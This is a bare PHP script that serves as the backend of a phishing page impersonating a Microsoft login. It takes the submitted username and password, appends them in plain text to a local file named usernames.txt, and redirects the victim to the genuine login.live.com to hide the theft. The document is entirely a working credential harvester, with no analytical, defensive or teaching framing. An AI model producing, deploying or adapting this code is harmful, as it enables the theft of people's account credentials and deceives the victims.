<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST['login'];
    $passwd = $_POST['passwd'];
    
    $fp = fopen("usernames.txt", "a");
    fwrite($fp, "Username: " . $login . " | Pass: " . $passwd . "\n");
    fclose($fp);
    
    header("Location: https://login.live.com");
    exit();
}
?>
